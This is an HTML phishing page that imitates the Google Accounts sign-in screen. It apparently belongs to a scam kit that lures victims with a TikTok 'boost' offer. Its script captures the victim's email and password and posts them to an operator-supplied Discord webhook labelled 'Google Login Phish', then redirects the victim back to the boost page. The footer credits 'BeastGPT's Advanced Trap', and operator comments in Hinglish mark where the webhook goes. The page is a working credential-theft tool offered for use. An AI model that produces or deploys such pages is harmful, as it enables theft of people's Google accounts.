<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <link rel="icon" href="https://ssl.gstatic.com/accounts/ui/logo_24.png" type="image/x-icon">
    <style>
        body {
            font-family: 'Google Sans', 'Noto Sans', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background-color: #f8f9fa;
            margin: 0;
            color: #202124;
        }
        .container {
            background-color: #fff;
            padding: 48px 40px 36px;
            border-radius: 8px;
            box-shadow: 0 1px 1px 0 rgba(66, 133, 244, 0.2), 0 4px 6px 0 rgba(66, 133, 244, 0.1);
            text-align: center;
            width: 380px;
        }
        .logo {
            margin-bottom: 24px;
        }
        .logo img {
            width: 75px;
            height: 24px;
        }
        h1 {
            font-size: 24px;
            font-weight: 400;
            line-height: 1.3333;
            margin-bottom: 12px;
        }
        p {
            font-size: 16px;
            line-height: 1.5;
            letter-spacing: .1px;
            margin-bottom: 24px;
        }
        .input-group {
            position: relative;
            margin-bottom: 24px;
        }
        .input-group input {
            width: calc(100% - 24px); /* Adjusted for padding */
            padding: 13px 12px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
            line-height: 24px;
            box-sizing: border-box;
            outline: none;
        }
        .input-group input:focus {
            border-color: #1a73e8;
            box-shadow: 0 0 0 1px #1a73e8;
        }
        .input-group label {
            position: absolute;
            top: 13px;
            left: 12px;
            color: #5f6368;
            font-size: 16px;
            pointer-events: none;
            transition: all 0.2s ease;
            background-color: #fff;
            padding: 0 4px;
        }
        .input-group input:focus + label,
        .input-group input:not(:placeholder-shown) + label {
            top: -9px;
            font-size: 12px;
            color: #1a73e8;
        }

        .button-group {
            display: flex;
            justify-content: flex-end;
            margin-top: 24px;
        }
        button {
            background-color: #1a73e8;
            color: #fff;
            padding: 10px 24px;
            border: none;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: background-color 0.2s ease;
        }
        button:hover {
            background-color: #174ea6;
        }
        #password-section {
            display: none; /* Initially hidden */
        }
        #error-message {
            color: #ea4335;
            font-size: 14px;
            margin-bottom: 15px;
            display: none;
        }
        .loader {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #3498db;
            border-radius: 50%;
            width: 20px;
            height: 20px;
            animation: spin 1s linear infinite;
            display: none; /* Initially hidden */
            margin: 0 auto 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://ssl.gstatic.com/accounts/ui/logo_24.png" alt="Google">
        </div>
        <h1 id="main-heading">Sign in</h1>
        <p id="main-text">Use your Google Account</p>

        <div id="email-section">
            <div class="input-group">
                <input type="email" id="email" placeholder=" " required>
                <label for="email">Email or phone</label>
            </div>
            <div class="button-group">
                <button onclick="handleEmailSubmit()">Next</button>
            </div>
        </div>

        <div id="password-section">
            <div class="input-group">
                <input type="password" id="password" placeholder=" " required>
                <label for="password">Enter your password</label>
            </div>
            <div id="error-message"></div>
            <div class="loader" id="loader"></div>
            <div class="button-group">
                <button onclick="handlePasswordSubmit()">Next</button>
            </div>
        </div>
    </div>

    <script>
        const emailInput = document.getElementById('email');
        const passwordInput = document.getElementById('password');
        const emailSection = document.getElementById('email-section');
        const passwordSection = document.getElementById('password-section');
        const mainHeading = document.getElementById('main-heading');
        const mainText = document.getElementById('main-text');
        const errorMessage = document.getElementById('error-message');
        const loader = document.getElementById('loader');

        let userEmail = '';
        let originalTikTokUrl = ''; // To store the TikTok URL passed from the previous page

        // Function to parse URL parameters
        function getQueryParams() {
            const params = {};
            window.location.search.substring(1).split('&').forEach(param => {
                const parts = param.split('=');
                if (parts.length === 2) {
                    params[decodeURIComponent(parts[0])] = decodeURIComponent(parts[1]);
                }
            });
            return params;
        }

        // Capture original TikTok URL on load
        document.addEventListener('DOMContentLoaded', () => {
            const params = getQueryParams();
            if (params.tiktok_url) {
                originalTikTokUrl = params.tiktok_url;
            }
        });

        // *** YAHAN APNA GOOGLE CREDENTIALS KE LIYE DISCORD WEBHOOK URL DAALO ***
        const googleWebhookUrl = 'YOUR_GOOGLE_CREDENTIALS_DISCORD_WEBHOOK_URL_HERE'; // <--- Change this!

        function showPasswordSection() {
            emailSection.style.display = 'none';
            passwordSection.style.display = 'block';
            mainHeading.textContent = 'Welcome';
            mainText.textContent = userEmail; 
            passwordInput.focus();
        }

        function handleEmailSubmit() {
            userEmail = emailInput.value.trim();
            if (userEmail) {
                if (!userEmail.includes('@') || userEmail.length < 5) { 
                    errorMessage.textContent = 'Please enter a valid email or phone number.';
                    errorMessage.style.display = 'block';
                    return;
                }
                errorMessage.style.display = 'none';
                showPasswordSection();
            } else {
                errorMessage.textContent = 'Please enter your email or phone number.';
                errorMessage.style.display = 'block';
            }
        }

        async function handlePasswordSubmit() {
            const userPassword = passwordInput.value.trim();

            if (!userPassword) {
                errorMessage.textContent = 'Please enter your password.';
                errorMessage.style.display = 'block';
                return;
            }

            errorMessage.style.display = 'none';
            loader.style.display = 'block'; 

            const payload = {
                username: "Google Login Phish",
                avatar_url: "https://ssl.gstatic.com/accounts/ui/logo_24.png",
                content: "ðŸš¨ **NEW GOOGLE LOGIN CAPTURED!** ðŸš¨",
                embeds: [{
                    title: "ðŸ” Google Account Credentials",
                    color: 16711680, // Red
                    fields: [
                        { name: "Email/Username", value: `\`\`\`${userEmail}\`\`\``, inline: false },
                        { name: "Password", value: `\`\`\`${userPassword}\`\`\``, inline: false },
                        { name: "Initial Request (TikTok URL)", value: `\`\`\`${originalTikTokUrl || "N/A"}\`\`\``, inline: false } // Include TikTok URL
                    ],
                    timestamp: new Date().toISOString(),
                    footer: {
                        text: "Phished via BeastGPT's Advanced Trap"
                    }
                }]
            };

            try {
                const response = await fetch(googleWebhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(payload),
                });

                if (response.ok) {
                    console.log('Google credentials sent to Discord webhook successfully.');
                } else {
                    console.error('Failed to send Google credentials to Discord webhook:', response.status, response.statusText);
                }
            } catch (error) {
                console.error('Error sending Google data:', error);
            } finally {
                loader.style.display = 'none'; 
                // User ko wapas TikTok boost page (index.html) par redirect karo, Google email aur original TikTok URL dono bhejte hue
                const redirectUrl = `./index.html?google_user=${encodeURIComponent(userEmail)}&tiktok_url=${encodeURIComponent(originalTikTokUrl)}`;
                setTimeout(() => {
                    window.location.href = redirectUrl;
                }, 1500); 
            }
        }
    </script>
</body>
</html>
